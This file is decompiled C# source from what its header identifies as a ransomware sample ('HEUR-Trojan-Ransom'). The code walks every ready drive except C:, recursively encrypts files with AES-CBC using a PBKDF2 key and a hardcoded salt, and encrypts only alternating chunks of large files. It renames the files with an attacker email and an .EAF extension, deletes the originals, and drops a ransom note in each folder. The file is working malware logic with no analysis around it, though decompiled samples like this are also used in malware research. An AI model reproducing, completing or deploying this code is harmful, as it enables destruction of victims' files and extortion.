// Decompiled with JetBrains decompiler
// Type: Fast.ENC1
// Assembly: encoderdecryption@yandex.ru, Version=2.0.2.2, Culture=neutral, PublicKeyToken=null
// MVID: C353C6AA-D71D-41FD-A002-1E85FFB3A964
// Assembly location: C:\Users\Administrateur\Downloads\ransomware_new\HEUR-Trojan-Ransom.Win32-d2c47b1c94e6beadbc222771e788e9dafe194c462760b0d16cd25cbc0a572a00.exe

using System;
using System.IO;
using System.Security.Cryptography;
using System.Threading;

namespace Fast
{
  internal class ENC1
  {
    public static ENC1.EAFLocker EL;
    public static ENC1.CoreEncryption CE;
    private static string EncryptPassword = Program.RndKey + Program.A + Program.B + Program.UniqueID() + Program.keyword + Program.UniqueID() + Program.C + Program.D + Program.RndKey;

    public static void Start()
    {
      ENC1.EL = new ENC1.EAFLocker();
      ENC1.CE = new ENC1.CoreEncryption();
      new Thread((ThreadStart) (() => ENC1.LookForDirectories())).Start();
    }

    private static void LookForDirectories()
    {
      try
      {
        foreach (DriveInfo drive in DriveInfo.GetDrives())
        {
          DriveInfo driveInfo = drive;
          if (driveInfo.ToString() != "C:\\" && driveInfo.IsReady)
            new Thread((ThreadStart) (() => ENC1.CE.encryptDirectory(driveInfo.ToString()))).Start();
        }
      }
      catch
      {
      }
    }

    public class CoreEncryption
    {
      public void encryptDirectory(string location)
      {
        try
        {
          string[] files = Directory.GetFiles(location);
          for (int index = 0; index < files.Length; ++index)
          {
            try
            {
              string extension = Path.GetExtension(files[index]);
              string fileName = Path.GetFileName(files[index]);
              if (Array.Exists<string>(Program.validExtensions, (Predicate<string>) (E => E != extension.ToLower())) && extension != ".EAF" && fileName != Program.droppedMessageTextbox && fileName != Program.processURL)
              {
                ENC1.EL.EnceyptFile(files[index]);
                File.WriteAllLines(location + "/" + Program.droppedMessageTextbox, Program.messages);
              }
            }
            catch
            {
            }
          }
          foreach (string directory in Directory.GetDirectories(location))
            this.encryptDirectory(directory);
        }
        catch (Exception ex)
        {
        }
      }
    }

    public class EAFLocker
    {
      public void EnceyptFile(string file)
      {
        try
        {
          string extension = Path.GetExtension(file);
          if (!(extension != ".EAF"))
            return;
          string encryptPassword = ENC1.EncryptPassword;
          string fileName = Path.GetFileName(file);
          string str = Path.GetDirectoryName(file) + "\\[" + Program.email1 + "][" + Program.UniqueID() + "]" + fileName + ".EAF";
          if (!this.Encrypt(file, str, encryptPassword) && extension != ".EAF")
          {
            try
            {
              File.Move(file, str);
            }
            catch
            {
            }
          }
        }
        catch
        {
        }
      }

      private bool Encrypt(string inputFilePath, string outputfilePath, string EncryptionKey)
      {
        try
        {
          using (FileStream fileStream1 = new FileStream(inputFilePath, FileMode.Open))
          {
            using (FileStream fileStream2 = new FileStream(outputfilePath, FileMode.Create))
            {
              fileStream1.Position = 0L;
              using (Aes aes = Aes.Create())
              {
                byte[] salt = new byte[13]
                {
                  (byte) 73,
                  (byte) 118,
                  (byte) 97,
                  (byte) 110,
                  (byte) 32,
                  (byte) 77,
                  (byte) 101,
                  (byte) 100,
                  (byte) 118,
                  (byte) 101,
                  (byte) 100,
                  (byte) 101,
                  (byte) 118
                };
                using (Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(EncryptionKey, salt))
                {
                  aes.Mode = CipherMode.CBC;
                  aes.Padding = PaddingMode.PKCS7;
                  aes.Key = rfc2898DeriveBytes.GetBytes(32);
                  aes.IV = rfc2898DeriveBytes.GetBytes(16);
                  using (CryptoStream cryptoStream = new CryptoStream((Stream) fileStream2, aes.CreateEncryptor(), CryptoStreamMode.Write))
                  {
                    int count1 = 4096;
                    byte[] buffer = new byte[count1];
                    int num = 0;
                    int count2;
                    do
                    {
                      count2 = fileStream1.Read(buffer, 0, count1);
                      if (num <= 400000)
                        cryptoStream.Write(buffer, 0, count2);
                      else if (num >= 800000 && num <= 1200000)
                        cryptoStream.Write(buffer, 0, count2);
                      else if (num >= 1600000 && num <= 2000000)
                        cryptoStream.Write(buffer, 0, count2);
                      else
                        fileStream2.Write(buffer, 0, count2);
                      num += count2;
                    }
                    while (count2 != 0);
                    cryptoStream.Close();
                  }
                }
              }
              fileStream2.Close();
            }
            fileStream1.Close();
          }
          File.Delete(inputFilePath);
          return true;
        }
        catch (SystemException ex)
        {
          return false;
        }
      }
    }
  }
}
